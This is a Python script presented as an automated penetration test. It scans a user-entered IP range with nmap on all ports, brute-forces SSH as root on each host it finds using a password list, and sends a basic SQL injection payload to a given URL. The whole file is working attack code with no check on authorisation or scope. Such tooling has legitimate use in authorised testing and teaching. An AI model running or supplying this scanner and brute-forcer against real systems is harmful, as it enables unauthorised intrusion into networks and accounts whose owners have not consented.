import nmap
import paramiko
import requests
import logging

logging.basicConfig(filename='automated_pentest.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def scan_network(ip_range):
    nm = nmap.PortScanner()
    try:
        logging.info(f'Starting network scan on {ip_range}')
        nm.scan(hosts=ip_range, arguments='-p 1-65535 -sV')
        return nm.all_hosts()
    except Exception as e:
        logging.error(f'Error during network scan: {e}')
        return []

def ssh_brute_force(ip, user, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        logging.info(f'Starting brute-force on {ip} for user {user}')
        with open(password_list, 'r') as passwords:
            for password in passwords:
                password = password.strip()
                try:
                    ssh.connect(ip, username=user, password=password)
                    logging.info(f'Success: {password}')
                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    logging.info(f'Failed: {password}')
        logging.info('Brute-force attack failed.')
    except Exception as e:
        logging.error(f'Error during brute-force attack: {e}')

def check_sql_injection(url):
    payload = "' OR '1'='1"
    try:
        logging.info(f'Starting SQL injection test on {url}')
        response = requests.get(url + payload)
        if "You have an error in your SQL syntax" in response.text:
            logging.info(f'Potential SQL Injection found at {url}')
        else:
            logging.info('No SQL Injection found.')
    except Exception as e:
        logging.error(f'Error checking SQL injection: {e}')

def automated_pentest(ip_range, web_url):
    hosts = scan_network(ip_range)
    for host in hosts:
        ssh_brute_force(host, 'root', 'passwords.txt')
    check_sql_injection(web_url)

if __name__ == "__main__":
    ip_range = input("Enter IP range to scan: ")
    web_url = input("Enter the URL to scan for SQL injection: ")
    automated_pentest(ip_range, web_url)
    print("Penetration testing complete. Check automated_pentest.log for details.")
